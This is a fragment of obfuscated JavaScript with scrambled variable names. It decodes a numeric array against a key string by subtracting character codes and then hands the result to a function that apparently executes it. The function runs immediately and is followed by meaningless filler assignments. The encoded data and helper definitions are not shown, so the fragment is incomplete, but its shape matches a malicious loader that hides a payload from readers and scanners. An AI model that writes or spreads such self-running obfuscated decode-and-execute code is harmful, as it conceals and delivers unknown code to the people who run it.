    acjno = function() {
        for (var aopvy; bjrvx < fikuv.length; bjrvx += 1) {
            var eqtvx = bjrvx % yqebzt.length + 1;
            var djlmv = yqebzt.substring(bjrvx % yqebzt.length, eqtvx);
            var zapxe = fikuv[bjrvx];
            ehirx += befot(zapxe - djlmv.charCodeAt(0));
        }
        acglpx(ehirx);
    };
acjno();
aist = "";
flpsx = 2005;
clotu = true;
bdfox = '';
dgnv = '';
uzavw = "uzavw";

